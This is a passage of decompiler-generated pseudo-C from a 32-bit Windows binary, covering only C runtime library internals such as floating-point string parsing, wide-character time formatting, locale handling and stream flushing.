  int v6; // [esp-Ch] [ebp-30h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int *v8; // [esp-4h] [ebp-28h]
  int v9; // [esp+8h] [ebp-1Ch] BYREF
  __crt_locale_pointers Locale; // [esp+Ch] [ebp-18h] BYREF
  char v11; // [esp+14h] [ebp-10h]
  double v12; // [esp+18h] [ebp-Ch] BYREF

  if ( a2 )
    *a2 = a1;
  if ( a1 )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v9, a3);
    v8 = (int *)&v12;
    v7 = v4;
    v6 = v4;
    v12 = 0.0;
    unknown_libname_112(&v6, a1, a2);
    v5 = __crt_strtox::parse_floating_point<__crt_strtox::c_string_character_source<char>,_LDBL12>(
           &Locale,
           v6,
           v7,
           (int)v8);
    if ( v5 == 3 || v5 == 2 )
      *_errno() = 34;
    result = v12;
    if ( v11 )
      *(_DWORD *)(v9 + 848) &= ~2u;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0.0;
  }
  return result;
}
// 466966: variable 'v4' is possibly undefined
// 466A34: using guessed type _DWORD __cdecl unknown_libname_112(_DWORD, _DWORD, _DWORD);
// 466927: using guessed type double var_C;

//----- (00466F20) --------------------------------------------------------
int __cdecl sub_466F20(char *a1, char **a2, char *a3)
{
  int v3; // edx
  char v4; // cl
  char v5; // al
  char *v6; // ebx
  int v7; // edx
  char v8; // cl
  char v9; // al

  v3 = 0;
  v4 = *a1;
  v5 = *a1;
  do
  {
    if ( v4 != byte_495DC4[v3] && v4 != byte_495DC8[v3] )
    {
      __crt_strtox::c_string_character_source<char>::unget(v5);
      *a1 = 0;
      *a2 = a3;
      return 7;
    }
    v4 = **a2;
    ++v3;
    ++*a2;
    *a1 = v4;
    v5 = v4;
  }
  while ( v3 != 3 );
  __crt_strtox::c_string_character_source<char>::unget(v4);
  v6 = *a2;
  v7 = 0;
  v8 = *(*a2)++;
  v9 = v8;
  *a1 = v8;
  while ( v8 == byte_495DCC[v7] || v8 == byte_495DD4[v7] )
  {
    v8 = **a2;
    ++v7;
    ++*a2;
    *a1 = v8;
    v9 = v8;
    if ( v7 == 5 )
    {
      __crt_strtox::c_string_character_source<char>::unget(v8);
      return 3;
    }
  }
  __crt_strtox::c_string_character_source<char>::unget(v9);
  *a1 = 0;
  *a2 = v6;
  return 3;
}
// 469C4F: using guessed type _DWORD __stdcall __crt_strtox::c_string_character_source<char>::unget(char);

//----- (00467488) --------------------------------------------------------
int __cdecl sub_467488(unsigned __int64 a1, int a2, __crt_strtox *a3, char a4, __crt_strtox::floating_point_value *a5)
{
  unsigned __int8 v5; // bl
  unsigned __int64 v6; // rdi
  bool v7; // zf
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // edx
  int v13; // eax
  int v14; // ecx
  unsigned int v15; // eax
  __int64 v16; // kr08_8
  char v17; // al
  int v18; // eax
  int v19; // ebx
  char v20; // cl
  unsigned int v21; // edx
  char v22; // al
  int v23; // eax
  unsigned __int64 v25; // rdi
  double *v26; // eax
  float *v27; // eax
  const struct __crt_strtox::floating_point_value *v29; // [esp+0h] [ebp-30h]
  __int64 v30; // [esp+Ch] [ebp-24h]
  __int64 v31; // [esp+14h] [ebp-1Ch]
  int v32; // [esp+1Ch] [ebp-14h]
  int v33; // [esp+1Ch] [ebp-14h]
  char v34; // [esp+20h] [ebp-10h]
  int v35; // [esp+24h] [ebp-Ch]
  char v36; // [esp+24h] [ebp-Ch]
  int v37; // [esp+28h] [ebp-8h]
  bool v38; // [esp+2Dh] [ebp-3h]
  char v39; // [esp+2Dh] [ebp-3h]
  char v40; // [esp+2Eh] [ebp-2h]
  char v41; // [esp+2Fh] [ebp-1h]

  v5 = 0;
  v6 = a1;
  if ( HIDWORD(a1) )
  {
    v7 = !_BitScanReverse((unsigned int *)&v10, HIDWORD(a1));
    if ( v7 )
      v11 = 0;
    else
      v11 = v10 + 1;
    v9 = v11 + 32;
  }
  else
  {
    v7 = !_BitScanReverse((unsigned int *)&v8, a1);
    if ( v7 )
      v9 = 0;
    else
      v9 = v8 + 1;
  }
  v41 = *((_BYTE *)a5 + 4);
  v12 = (v41 == 0 ? 24 : 53) - v9;
  v35 = v12;
  v37 = a2 - v12;
  v32 = v41 == 0 ? 127 : 1023;
  if ( a2 - v12 > v32 )
    goto LABEL_52;
  if ( a2 - v12 < (v41 == 0 ? -126 : -1022) )
  {
    v13 = v32 + a2 - 1;
    v14 = -v32;
    v33 = v13;
    v37 = v14;
    if ( v13 < 0 )
    {
      v15 = -v13;
      v34 = v15;
      if ( v15 < 0x40 )
      {
        v16 = (1i64 << ((unsigned __int8)v15 - 1)) - 1;
        v38 = (a1 & (1i64 << v15)) != 0;
        LODWORD(v31) = (unsigned __int64)(1i64 << ((unsigned __int8)v15 - 1)) >> 32;
        HIDWORD(v31) = 1i64 << ((unsigned __int8)v15 - 1);
        if ( !a4 || (v17 = 0, (a1 & v16) != 0) )
          v17 = 1;
        v40 = v17;
        if ( (v31 & __PAIR64__(a1, HIDWORD(a1))) != 0 || v17 )
        {
          v18 = fegetround();
          if ( v18 )
          {
            if ( v18 == 256 )
            {
              v5 = (unsigned __int8)a3;
            }
            else if ( v18 == 512 )
            {
              v5 = (unsigned __int8)a3 ^ 1;
            }
          }
          else if ( (v31 & __PAIR64__(a1, HIDWORD(a1))) != 0 && (v40 || v38) )
          {
            v5 = 1;
          }
        }
        v6 = (a1 >> v34) + v5;
        if ( v6 )
        {
          if ( v6 > __crt_strtox::floating_point_value::denormal_mantissa_mask(a5) )
          {
            v19 = a2 - v33 - v35 - 1;
            goto LABEL_58;
          }
          goto LABEL_57;
        }
      }
      __crt_strtox::assemble_floating_point_zero(a3, a5, v29);
      return 2;
    }
    v20 = v13;
    goto LABEL_56;
  }
  if ( v12 < 0 )
  {
    v21 = v9 - (*((_BYTE *)a5 + 4) == 0 ? 24 : 53);
    v36 = v9 - (*((_BYTE *)a5 + 4) == 0 ? 24 : 53);
    if ( v21 < 0x40 )
    {
      v30 = 1i64 << ((unsigned __int8)v21 - 1);
      if ( !a4 || (v22 = 0, (a1 & (v30 - 1)) != 0) )
        v22 = 1;
      v39 = v22;
      if ( (v30 & a1) != 0 || v22 )
      {
        v23 = fegetround();
        if ( v23 )
        {
          if ( v23 == 256 )
          {
            v5 = (unsigned __int8)a3;
          }
          else if ( v23 == 512 )
          {
            v5 = (unsigned __int8)a3 ^ 1;
          }
        }
        else if ( (v30 & a1) != 0 && (v39 || (a1 & (1i64 << v36)) != 0) )
        {
          v5 = 1;
        }
      }
      v6 = v5 + (a1 >> v36);
    }
    else
    {
      v6 = 0i64;
    }
    if ( v6 <= __crt_strtox::floating_point_value::normal_mantissa_mask(a5) )
      goto LABEL_57;
    v6 >>= 1;
    v19 = v37 + 1;
    if ( v37 + 1 <= (*((_BYTE *)a5 + 4) == 0 ? 127 : 1023) )
      goto LABEL_58;
LABEL_52:
    __crt_strtox::assemble_floating_point_infinity(a3, a5, v29);
    return 3;
  }
  if ( v12 > 0 )
  {
    v20 = v12;
LABEL_56:
    v6 = a1 << v20;
  }
LABEL_57:
  v19 = v37;
LABEL_58:
  v25 = __crt_strtox::floating_point_value::denormal_mantissa_mask(a5) & v6;
  if ( *((_BYTE *)a5 + 4) )
  {
    v26 = __crt_strtox::floating_point_value::as_double(a5);
    return __crt_strtox::assemble_floating_point_value_t<double>((char)a3, v19, v25, HIDWORD(v25), v26);
  }
  else
  {
    v27 = __crt_strtox::floating_point_value::as_float(a5);
    return __crt_strtox::assemble_floating_point_value_t<float>((char)a3, v19, v25, HIDWORD(v25), v27);
  }
}
// 46763E: variable 'v29' is possibly undefined
// 466826: using guessed type _DWORD __cdecl __crt_strtox::assemble_floating_point_value_t<float>(char, _DWORD, _DWORD, _DWORD, _DWORD);
// 466856: using guessed type _DWORD __cdecl __crt_strtox::assemble_floating_point_value_t<double>(char, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00469D27) --------------------------------------------------------
void __cdecl sub_469D27(int a1, _DWORD *a2)
{
  sub_466927(a1, a2, 0);
}

//----- (00469D3E) --------------------------------------------------------
void __cdecl sub_469D3E(int a1, _DWORD *a2)
{
  sub_466898(a1, a2, 0);
}

//----- (0046C024) --------------------------------------------------------
int __cdecl sub_46C024(wchar_t *a1, int a2, wchar_t *a3, struct tm *a4, struct __crt_lc_time_data *a5)
{
  return sub_46C044(a1, a2, a3, a4, a5, 0);
}

//----- (0046C044) --------------------------------------------------------
int __cdecl sub_46C044(
        wchar_t *a1,
        int a2,
        wchar_t *a3,
        struct tm *a4,
        struct __crt_lc_time_data *a5,
        struct __crt_locale_pointers *a6)
{
  wchar_t *v6; // esi
  struct __crt_lc_time_data *v8; // edx
  unsigned int v9; // eax
  wchar_t *v10; // ecx
  int v11; // ebx
  int v12; // ecx
  wchar_t v13; // ax
  bool v14; // zf
  char v15; // cl
  int v16; // [esp+4h] [ebp-28h] BYREF
  __crt_locale_pointers Locale; // [esp+8h] [ebp-24h] BYREF
  char v18; // [esp+10h] [ebp-1Ch]
  wchar_t *v19; // [esp+14h] [ebp-18h]
  int v20; // [esp+18h] [ebp-14h]
  bool v21[4]; // [esp+1Ch] [ebp-10h]
  wchar_t *v22; // [esp+20h] [ebp-Ch] BYREF
  unsigned int v23; // [esp+24h] [ebp-8h] BYREF

  if ( !a1 || !a2 || (v6 = a3, *a1 = 0, !a3) )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v16, a6);
  v8 = a5;
  if ( !a5 )
  {
    v8 = (struct __crt_lc_time_data *)*((_DWORD *)Locale.locinfo + 39);
    a5 = v8;
  }
  v9 = a2;
  v10 = a1;
  v11 = 0;
  v22 = a1;
  v23 = a2;
  while ( 1 )
  {
    v20 = *v6;
    v19 = v6;
    if ( !(_WORD)v20 )
    {
LABEL_21:
      if ( v9 )
      {
        *v10 = 0;
        v11 = a2 - v23;
        goto LABEL_30;
      }
      goto LABEL_25;
    }
    if ( (_WORD)v20 == 37 )
      break;
    *v10 = v20;
    v10 = v22 + 1;
    v9 = v23 - 1;
    ++v22;
    --v23;
LABEL_20:
    v8 = a5;
    ++v6;
    if ( !v9 )
      goto LABEL_21;
  }
  if ( !a4 )
    goto LABEL_29;
  ++v6;
  v21[0] = 0;
  v12 = *v6;
  if ( v12 == 35 )
  {
    v6 = v19 + 2;
    v21[0] = 1;
    LOWORD(v12) = v19[2];
  }
  if ( (_WORD)v12 == 69 || (v13 = v12, (_WORD)v12 == 79) )
    v13 = *++v6;
  v14 = !expand_time(&Locale, v13, a4, &v22, &v23, v8, v21[0]);
  v9 = v23;
  if ( !v14 )
  {
    v10 = v22;
    goto LABEL_20;
  }
  if ( v23 )
  {
    v15 = 1;
    goto LABEL_26;
  }
LABEL_25:
  v15 = 0;
LABEL_26:
  *a1 = 0;
  if ( !v15 && !v9 )
  {
    *_errno() = 34;
    goto LABEL_30;
  }
LABEL_29:
  *_errno() = 22;
  _invalid_parameter_noinfo();
LABEL_30:
  if ( v18 )
    *(_DWORD *)(v16 + 848) &= ~2u;
  return v11;
}
// 46C0C3: conditional instruction was optimized away because %arg_4.4!=0

//----- (0046C4B5) --------------------------------------------------------
int __cdecl sub_46C4B5(int a1)
{
  int result; // eax

  result = a1;
  dword_50031C = a1;
  return result;
}
// 50031C: using guessed type int dword_50031C;

//----- (0046C9C3) --------------------------------------------------------
int sub_46C9C3()
{
  int result; // eax

  result = dword_50052C;
  if ( !dword_50052C )
  {
    if ( !dword_500530
      || common_initialize_environment_nolock<char>() && initialize_environment_by_cloning_nolock<char>() )
    {
      return 0;
    }
    else
    {
      return dword_50052C;
    }
  }
  return result;
}
// 46C9EF: using guessed type int common_initialize_environment_nolock<char>(void);
// 46CC9C: using guessed type int initialize_environment_by_cloning_nolock<char>(void);
// 50052C: using guessed type int dword_50052C;
// 500530: using guessed type int dword_500530;

//----- (0046CD48) --------------------------------------------------------
void *__cdecl sub_46CD48(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_500538 )
    return (void *)unknown_libname_115(*a1);
  return result;
}

//----- (0046CD63) --------------------------------------------------------
void *__cdecl sub_46CD63(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_500534 )
    return (void *)unknown_libname_115(*a1);
  return result;
}

//----- (0046CDBF) --------------------------------------------------------
int __stdcall sub_46CDBF(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+10h] [ebp-1Ch]

  __acrt_lock(*a1);
  v4 = unknown_libname_117(a2);
  __acrt_unlock(*a3);
  return v4;
}
// 46640C: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 466454: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);
// 46CF9E: using guessed type int __thiscall unknown_libname_117(_DWORD);

//----- (0046CE1A) --------------------------------------------------------
int __stdcall sub_46CE1A(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+10h] [ebp-1Ch]

  __acrt_lock(*a1);
  v4 = _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(a2);
  __acrt_unlock(*a3);
  return v4;
}
// 46640C: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 466454: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);
// 46CE75: using guessed type int __thiscall _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(_DWORD);

//----- (0046D078) --------------------------------------------------------
int __cdecl sub_46D078(_onexit_t Function)
{
  return _register_onexit_function(&stru_50053C, Function);
}

//----- (0046D117) --------------------------------------------------------
char sub_46D117()
{
  dword_50056C = (struct __crt_locale_data *)&Locale_pctype_array;
  return 1;
}

//----- (0046D13E) --------------------------------------------------------
char sub_46D13E()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 46CD83: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0046D174) --------------------------------------------------------
__vcrt_bool sub_46D174()
{
  return __vcrt_uninitialize(0);
}

//----- (0046D254) --------------------------------------------------------
int sub_46D254()
{
  return dword_500554;
}
// 500554: using guessed type int dword_500554;

//----- (0046D25A) --------------------------------------------------------
int __cdecl sub_46D25A(int a1)
{
  int result; // eax

  result = a1;
  dword_500554 = a1;
  return result;
}
// 500554: using guessed type int dword_500554;

//----- (0046D281) --------------------------------------------------------
int __cdecl sub_46D281(int a1)
{
  int result; // eax

  result = a1;
  dword_500558 = a1;
  return result;
}
// 500558: using guessed type int dword_500558;

//----- (0046D74F) --------------------------------------------------------
__int32 sub_46D74F()
{
  return _InterlockedExchange(&dword_500560, 1);
}
// 500560: using guessed type int dword_500560;

//----- (0046E2E7) --------------------------------------------------------
UINT __cdecl sub_46E2E7(UINT *a1, int a2, wchar_t *a3)
{
  int v3; // ebx
  wchar_t *p_Source; // eax
  wchar_t *v5; // edx
  wchar_t *v6; // ecx
  wchar_t v7; // si
  bool v8; // cf
  bool v9; // zf
  int v10; // esi
  wchar_t v11; // si
  wchar_t *v12; // eax
  UINT result; // eax
  wchar_t *v14; // ecx
  __int16 v15; // ax
  _DWORD *v16; // eax
  wchar_t *v17; // ecx
  wchar_t *v18; // eax
  _DWORD *v19; // esi
  int v20; // edx
  rsize_t *v21; // ecx
  rsize_t *v22; // esi
  rsize_t v23; // eax
  int v24; // ecx
  int v25; // ebx
  wchar_t *v26; // eax
  wchar_t *v27; // ecx
  int v28; // eax
  wchar_t *v29; // ecx
  UINT v30; // [esp+Ch] [ebp-2E4h]
  UINT v31; // [esp+10h] [ebp-2E0h]
  _DWORD *Block; // [esp+18h] [ebp-2D8h]
  void *v33; // [esp+1Ch] [ebp-2D4h]
  int v34; // [esp+20h] [ebp-2D0h]
  int SizeInWords; // [esp+24h] [ebp-2CCh]
  rsize_t SizeInWordsa; // [esp+24h] [ebp-2CCh]
  int v37; // [esp+28h] [ebp-2C8h]
  int v38; // [esp+2Ch] [ebp-2C4h] BYREF
  rsize_t *v39; // [esp+30h] [ebp-2C0h]
  wchar_t *Expression; // [esp+34h] [ebp-2BCh]
  wchar_t v41[86]; // [esp+38h] [ebp-2B8h] BYREF
  WORD Buf1[128]; // [esp+E4h] [ebp-20Ch] BYREF
  wchar_t Source; // [esp+1E4h] [ebp-10Ch] BYREF
  __int16 v44; // [esp+1E6h] [ebp-10Ah] BYREF

  v3 = a2;
  v34 = __acrt_getptd() + 632;
  if ( !_expandlocale(a3, &Source, 0x83u, v41, 0x55u, (int)&v38) )
    return 0;
  p_Source = &Source;
  v37 = 4 * (a2 + 2);
  v5 = (wchar_t *)a1[v37];
  v6 = v5;
  while ( 1 )
  {
    v7 = *p_Source;
    Expression = 0;
    v8 = v7 < *v6;
    v9 = v7 == *v6;
    v10 = 4 * (a2 + 2);
    if ( !v9 )
      break;
    if ( !*p_Source )
      goto LABEL_7;
    v11 = p_Source[1];
    v8 = v11 < v6[1];
    v9 = v11 == v6[1];
    HIWORD(v39) = v11;
    v10 = 4 * (a2 + 2);
    if ( !v9 )
      break;
    p_Source += 2;
    v6 += 2;
    if ( !HIWORD(v39) )
    {
LABEL_7:
      v12 = Expression;
      goto LABEL_9;
    }
  }
  v12 = (wchar_t *)(v8 ? -1 : 1);
LABEL_9:
  if ( !v12 )
    return (UINT)v5;
  v14 = &Source;
  do
    v15 = *v14++;
  while ( v15 != (_WORD)Expression );
  SizeInWords = (((char *)v14 - (char *)&v44) >> 1) + 1;
  v16 = _malloc_base(2 * SizeInWords + 4);
  Block = v16;
  if ( !v16 )
    return 0;
  v33 = (void *)a1[v10];
  v31 = a1[a2 + 40];
  v30 = a1[2];
  v39 = v16 + 1;
  if ( wcscpy_s((wchar_t *)v16 + 2, SizeInWords, &Source) )
    _invoke_watson(Expression, Expression, Expression, (unsigned int)Expression, (uintptr_t)Expression);
  v9 = Source == 67;
  a1[v10] = (UINT)v39;
  if ( !v9 || v44 )
  {
    v18 = (wchar_t *)__acrt_copy_locale_name(v41);
    v17 = Expression;
  }
  else
  {
    v17 = Expression;
    v18 = Expression;
  }
  a1[a2 + 40] = (UINT)v18;
  switch ( a2 )
  {
    case 2:
      v19 = (_DWORD *)v34;
      v20 = (int)v17;
      v21 = (rsize_t *)v34;
      a1[2] = v38;
      v39 = (rsize_t *)v34;
      SizeInWordsa = *(_DWORD *)(v34 + 32);
      v38 = *(_DWORD *)(v34 + 36);
      while ( a1[2] != *v21 )
      {
        v22 = v39;
        ++v20;
        v23 = *v21;
        v24 = v21[1];
        *v39 = SizeInWordsa;
        v25 = v38;
        v38 = v24;
        v21 = v22 + 2;
        v22[1] = v25;
        v3 = a2;
        v19 = (_DWORD *)v34;
        SizeInWordsa = v23;
        v39 = v21;
        if ( v20 >= 5 )
          goto LABEL_26;
      }
      if ( v20 )
      {
        *v19 = v19[2 * v20];
        v19[1] = v19[2 * v20 + 1];
        v19[2 * v20] = SizeInWordsa;
        v19[2 * v20 + 1] = v38;
      }
LABEL_26:
      if ( v20 == 5 )
      {
        if ( __acrt_GetStringTypeA((struct __crt_locale_pointers *)Expression, 1u, &MultiByteStr, 127, Buf1, a1[2], 1) )
        {
          v26 = Expression;
          do
          {
            Buf1[(_DWORD)v26] &= 0x1FFu;
            v26 = (wchar_t *)((char *)v26 + 1);
          }
          while ( (unsigned int)v26 < 0x7F );
          v27 = (wchar_t *)(memcmp(Buf1, Buf2, 0xFEu) == 0);
        }
        else
        {
          v27 = Expression;
        }
        v19[1] = v27;
        *v19 = a1[2];
      }
      a1[6] = v19[1];
      break;
    case 1:
      a1[4] = v38;
      break;
    case 5:
      a1[5] = v38;
      break;
  }
  if ( ((int (__cdecl *)(UINT *))*(&off_4967E8 + 3 * v3))(a1) )
  {
    a1[v37] = (UINT)v33;
    _free_base((void *)a1[v3 + 40]);
    a1[v3 + 40] = v31;
    _free_base(Block);
    a1[2] = v30;
    return 0;
  }
  if ( v33 == &unk_4F82D8 || _InterlockedExchangeAdd((volatile signed __int32 *)a1[4 * v3 + 10], 0xFFFFFFFF) )
  {
    v28 = 4 * (a2 + 2);
  }
  else
  {
    _free_base((void *)a1[4 * v3 + 10]);
    _free_base((void *)a1[4 * v3 + 9]);
    _free_base((void *)a1[v3 + 40]);
    v28 = 4 * (a2 + 2);
    v29 = Expression;
    a1[v37] = (UINT)Expression;
    a1[v3 + 40] = (UINT)v29;
  }
  *Block = 1;
  result = a1[v28];
  a1[4 * v3 + 10] = (UINT)Block;
  return result;
}
// 46FCE0: using guessed type int __acrt_getptd(void);
// 4967E8: using guessed type int (*off_4967E8)();
// 46E2E7: using guessed type WORD Buf1[128];

//----- (0046EADE) --------------------------------------------------------
int sub_46EADE()
{
  return dword_500564;
}
// 500564: using guessed type int dword_500564;

//----- (0046EB14) --------------------------------------------------------
int *sub_46EB14()
{
  return &dword_500568;
}
// 500568: using guessed type int dword_500568;

//----- (0046EE03) --------------------------------------------------------
int sub_46EE03()
{
  return common_flush_all(1);
}

//----- (0047019F) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_47019F(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_50056C )
  {
    result = (struct __crt_locale_data *)dword_4F83B8;
    if ( (dword_4F83B8 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)sub_479435();
      *a2 = result;
    }
  }
  return result;
}
// 4F83B8: using guessed type int dword_4F83B8;

//----- (004701CC) --------------------------------------------------------
struct __crt_multibyte_data *__cdecl sub_4701CC(int a1, struct __crt_multibyte_data **a2)
{
  struct __crt_multibyte_data *result; // eax

  result = *a2;
  if ( *a2 != dword_500958 )
  {
    result = (struct __crt_multibyte_data *)dword_4F83B8;
    if ( (dword_4F83B8 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = sub_477CE0();
      *a2 = result;
    }
  }
  return result;
}
// 4F83B8: using guessed type int dword_4F83B8;

//----- (004702EF) --------------------------------------------------------
int *sub_4702EF()
{
  return &dword_500574;
}
// 500574: using guessed type int dword_500574;

//----- (004702F5) --------------------------------------------------------
int *sub_4702F5()
{
  return &dword_500578;
}
// 500578: using guessed type int dword_500578;

//----- (004702FB) --------------------------------------------------------
int *sub_4702FB()
{
  return &dword_500570;
}
// 500570: using guessed type int dword_500570;

//----- (00470301) --------------------------------------------------------
int sub_470301()
{
  return dword_50057C;
}
// 50057C: using guessed type int dword_50057C;

//----- (00470307) --------------------------------------------------------
int __cdecl sub_470307(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_500574;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 500574: using guessed type int dword_500574;

//----- (00470333) --------------------------------------------------------
int __cdecl sub_470333(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_500578;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 500578: using guessed type int dword_500578;

//----- (0047035F) --------------------------------------------------------
int __cdecl sub_47035F(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_500570;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 500570: using guessed type int dword_500570;

//----- (00470FA3) --------------------------------------------------------
BOOL __stdcall LocaleEnumProc(LPWSTR a1)
{
  return _lambda_29d3c280b90b41c2ae070ffca879996a_::operator()(a1);
}
// 47102C: using guessed type _DWORD __stdcall _lambda_29d3c280b90b41c2ae070ffca879996a_::operator()(_DWORD);

//----- (004710C3) --------------------------------------------------------
int sub_4710C3()
{
  return try_get_function(11, "GetLocaleInfoEx", &unk_497278, &unk_497280);
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004710DD) --------------------------------------------------------
int sub_4710DD()
{
  return try_get_function(14, "GetTimeFormatEx", &unk_497284, "GetTimeFormatEx");
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004710F7) --------------------------------------------------------
int sub_4710F7()
{
  return try_get_function(15, "GetUserDefaultLocaleName", &unk_49729C, "GetUserDefaultLocaleName");
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00471111) --------------------------------------------------------
int sub_471111()
{
  return try_get_function(19, "IsValidLocaleName", &unk_4972C8, "IsValidLocaleName");
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0047112B) --------------------------------------------------------
int sub_47112B()
{
  return try_get_function(21, "LCIDToLocaleName", &unk_4972EC, "LCIDToLocaleName");
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00471145) --------------------------------------------------------
int sub_471145()
{
  return try_get_function(20, "LCMapStringEx", &unk_4972E4, &unk_4972EC);
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0047115F) --------------------------------------------------------
int sub_47115F()
{
  return try_get_function(22, "LocaleNameToLCID", &unk_497308, "LocaleNameToLCID");
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004712C3) --------------------------------------------------------
int __stdcall sub_4712C3(int a1)
{
  int (__thiscall *function)(_DWORD, int, int); // eax

  function = (int (__thiscall *)(_DWORD, int, int))try_get_function(
                                                     28,
                                                     "AppPolicyGetProcessTerminationMethod",
                                                     &unk_497324,
                                                     "AppPolicyGetProcessTerminationMethod");
  if ( function )
    return function(function, -6, a1);
  else
    return -1073741275;
}
// 471240: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004716EA) --------------------------------------------------------
int __stdcall sub_4716EA(
        wchar_t *a1,
        DWORD dwMapFlags,
        LPCWSTR lpSrcStr,
        int cchSrc,
        LPWSTR lpDestStr,
        int cchDest,
        int a7,
        int a8,
        int a9)
{
  int (__thiscall *v9)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int); // eax
  LCID v11; // eax

  v9 = (int (__thiscall *)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int))sub_471145();
  if ( v9 )
    return v9(v9, a1, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest, a7, a8, a9);
  v11 = __acrt_LocaleNameToLCID(a1, 0);
  return LCMapStringW(v11, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);
}

//----- (0047184C) --------------------------------------------------------
int __cdecl sub_47184C(int a1, FILE *Stream)
{
  int v2; // edi
  FILE *v3; // eax
  char v5; // al
  bool v6; // zf

  v2 = _fileno(Stream);
  if ( (Stream->_flag & 6) == 0 )
  {
    *_errno() = 9;
LABEL_3:
    v3 = Stream;
LABEL_4:
    _InterlockedOr(&v3->_flag, 0x10u);
    return -1;
  }
  if ( (Stream->_flag & 0x1000) != 0 )
  {
    *_errno() = 34;
    goto LABEL_3;
  }
  if ( (Stream->_flag & 1) != 0 )
  {
    v5 = stream_is_at_end_of_file_nolock(Stream);
    Stream->_base = 0;
    v6 = v5 == 0;
    v3 = Stream;
    if ( v6 )
      goto LABEL_4;
    Stream->_ptr = (char *)Stream->_cnt;
    _InterlockedAnd(&Stream->_flag, 0xFFFFFFFE);
  }
  _InterlockedOr(&Stream->_flag, 2u);
  _InterlockedAnd(&Stream->_flag, 0xFFFFFFF7);
  Stream->_base = 0;
  if ( (Stream->_flag & 0x4C0) == 0 && (Stream != __acrt_iob_func(1u) && Stream != __acrt_iob_func(2u) || !_isatty(v2)) )
    __acrt_stdio_allocate_buffer_nolock(Stream);
  if ( (unsigned __int8)write_buffer_nolock<char>(a1, Stream) )
    return (unsigned __int8)a1;
  _InterlockedOr(&Stream->_flag, 0x10u);
  return -1;
}
// 471A2D: using guessed type int __cdecl stream_is_at_end_of_file_nolock(_DWORD);
// 47B6EF: using guessed type _DWORD __cdecl __acrt_stdio_allocate_buffer_nolock(_DWORD);

//----- (00471AB2) --------------------------------------------------------
int __cdecl sub_471AB2(int a1, FILE *a2)
{
  return sub_47184C(a1, a2);
}

//----- (004726B2) --------------------------------------------------------
int __cdecl sub_4726B2(int a1)
{
  int v2; // [esp+4h] [ebp-10h] BYREF
  int *v3; // [esp+8h] [ebp-Ch] BYREF
  int v4; // [esp+Ch] [ebp-8h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_500920
      && (*(_BYTE *)(&lpCriticalSection[a1 >> 6][1].LockSemaphore + 14 * (a1 & 0x3F)) & 1) != 0 )
    {
      v4 = a1;
      v3 = &a1;
      v2 = a1;
      return __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(
               &v2,
               &v3,
               &v4);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 472626: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(_DWORD, _DWORD, _DWORD);
// 500720: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];
// 500920: using guessed type int dword_500920;
// 4726B2: using guessed type int var_8;

//----- (00472B63) --------------------------------------------------------
int __cdecl sub_472B63(
        double *a1,
        char *Str,
        unsigned int a3,
